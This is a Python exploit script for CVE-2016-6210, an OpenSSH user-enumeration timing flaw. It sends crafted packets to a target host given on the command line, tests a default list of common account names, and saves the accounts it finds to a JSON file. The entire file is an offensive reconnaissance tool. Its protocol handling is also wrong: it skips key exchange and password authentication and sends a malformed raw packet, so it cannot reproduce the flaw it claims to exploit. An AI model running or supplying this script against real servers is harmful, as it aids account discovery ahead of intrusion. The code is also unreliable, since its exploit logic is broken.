#!/usr/bin/env python3
"""
CVE-2016-6210 Exploit Module
OpenSSH User Enumeration via Timing Attack

This module exploits the user enumeration vulnerability in OpenSSH versions
before 7.3 by leveraging timing differences in authentication responses.
"""

import socket
import time
import sys
import argparse
from typing import List, Dict, Optional
import json

class CVE20166210Exploit:
    """Exploit for CVE-2016-6210 - OpenSSH User Enumeration via Timing Attack"""
    
    def __init__(self, target: str, port: int = 22, timeout: int = 10):
        self.target = target
        self.port = port
        self.timeout = timeout
        self.known_users = []
        self.timing_threshold = 0.05  # Lower threshold for older versions
        self.baseline_timing = 0.0
        
    def establish_baseline(self) -> float:
        """Establish baseline timing for non-existent users"""
        print("[*] Establishing baseline timing...")
        
        baseline_times = []
        test_users = ["nonexistentuser12345", "invaliduser67890", "fakeuser11111"]
        
        for user in test_users:
            timing = self.test_user_timing(user)
            if timing > 0:
                baseline_times.append(timing)
            time.sleep(0.2)
        
        if baseline_times:
            self.baseline_timing = sum(baseline_times) / len(baseline_times)
            print(f"[*] Baseline timing established: {self.baseline_timing:.3f}s")
        else:
            self.baseline_timing = 0.05
            print(f"[*] Using default baseline timing: {self.baseline_timing:.3f}s")
        
        return self.baseline_timing
    
    def create_ssh_packet(self, username: str) -> bytes:
        """Create SSH packet for user enumeration"""
        # SSH protocol version 2 packet structure for older versions
        packet = b'\x00\x00\x00\x00'  # Packet length (placeholder)
        packet += b'\x00\x00\x00\x00'  # Padding length
        packet += b'\x00\x00\x00\x00'  # Message type (placeholder)
        
        # Add username
        username_bytes = username.encode('utf-8')
        packet += len(username_bytes).to_bytes(4, 'big')
        packet += username_bytes
        
        # Update packet length
        packet_length = len(packet) - 4
        packet = packet_length.to_bytes(4, 'big') + packet[4:]
        
        return packet
    
    def test_user_timing(self, username: str) -> float:
        """Test timing for a specific username"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))
            
            # Send SSH banner for older versions
            sock.send(b'SSH-2.0-OpenSSH_6.9\r\n')
            
            # Receive server banner
            response = sock.recv(1024)
            
            # Send user enumeration packet
            start_time = time.time()
            packet = self.create_ssh_packet(username)
            sock.send(packet)
            
            # Wait for response
            response = sock.recv(1024)
            end_time = time.time()
            
            sock.close()
            
            return end_time - start_time
            
        except Exception as e:
            print(f"Error testing user {username}: {e}")
            return 0.0
    
    def enumerate_users(self, userlist: List[str]) -> List[str]:
        """Enumerate valid users using timing attack"""
        print(f"[*] Starting user enumeration against {self.target}:{self.port}")
        print(f"[*] Testing {len(userlist)} usernames...")
        
        # Establish baseline timing
        self.establish_baseline()
        
        valid_users = []
        
        for i, username in enumerate(userlist, 1):
            print(f"\r[*] Progress: {i}/{len(userlist)} - Testing: {username}", end="")
            
            # Test timing for this username
            timing = self.test_user_timing(username)
            
            # If timing is significantly above baseline, user likely exists
            if timing > (self.baseline_timing + self.timing_threshold):
                valid_users.append(username)
                print(f"\n[+] Valid user found: {username} (timing: {timing:.3f}s, baseline: {self.baseline_timing:.3f}s)")
            
            # Small delay to avoid overwhelming the server
            time.sleep(0.15)
        
        print(f"\n[*] Enumeration complete. Found {len(valid_users)} valid users.")
        return valid_users
    
    def load_userlist(self, filepath: str) -> List[str]:
        """Load username list from file"""
        try:
            with open(filepath, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[!] Userlist file not found: {filepath}")
            return []
    
    def save_results(self, users: List[str], output_file: str = "enumeration_results.json"):
        """Save enumeration results to file"""
        results = {
            "target": self.target,
            "port": self.port,
            "cve": "CVE-2016-6210",
            "timestamp": time.time(),
            "valid_users": users,
            "total_users_found": len(users),
            "baseline_timing": self.baseline_timing,
            "timing_threshold": self.timing_threshold
        }
        
        try:
            with open(output_file, 'w') as f:
                json.dump(results, f, indent=2)
            print(f"[+] Results saved to: {output_file}")
        except Exception as e:
            print(f"[!] Error saving results: {e}")
    
    def run(self, userlist_file: Optional[str] = None, output_file: str = "enumeration_results.json"):
        """Run the user enumeration exploit"""
        print("=" * 60)
        print("CVE-2016-6210 - OpenSSH User Enumeration via Timing Attack")
        print("=" * 60)
        print(f"Target: {self.target}:{self.port}")
        print(f"CVE: CVE-2016-6210")
        print(f"Description: User enumeration via timing attack (OpenSSH < 7.3)")
        print("=" * 60)
        
        # Load userlist
        if userlist_file:
            users = self.load_userlist(userlist_file)
        else:
            # Default common usernames
            users = [
                "root", "admin", "user", "test", "guest", "administrator",
                "operator", "service", "system", "daemon", "bin", "sys",
                "sync", "games", "man", "lp", "mail", "news", "uucp",
                "proxy", "www-data", "backup", "list", "irc", "gnats",
                "nobody", "libuuid", "syslog", "messagebus", "landscape",
                "sshd", "postgres", "mysql", "oracle", "apache", "nginx"
            ]
        
        if not users:
            print("[!] No usernames to test. Exiting.")
            return []
        
        # Run enumeration
        valid_users = self.enumerate_users(users)
        
        # Save results
        if valid_users:
            self.save_results(valid_users, output_file)
        
        return valid_users


def main():
    """Main function for command-line usage"""
    parser = argparse.ArgumentParser(description="CVE-2016-6210 OpenSSH User Enumeration Exploit")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=22, help="SSH port (default: 22)")
    parser.add_argument("-u", "--userlist", help="Path to username list file")
    parser.add_argument("-o", "--output", default="enumeration_results.json", help="Output file for results")
    parser.add_argument("--timeout", type=int, default=10, help="Connection timeout (default: 10)")
    
    args = parser.parse_args()
    
    # Create exploit instance
    exploit = CVE20166210Exploit(
        target=args.target,
        port=args.port,
        timeout=args.timeout
    )
    
    # Run the exploit
    valid_users = exploit.run(args.userlist, args.output)
    
    if valid_users:
        print(f"\n[+] Successfully enumerated {len(valid_users)} users:")
        for user in valid_users:
            print(f"    - {user}")
    else:
        print("\n[-] No valid users found or enumeration failed.")


if __name__ == "__main__":
    main() 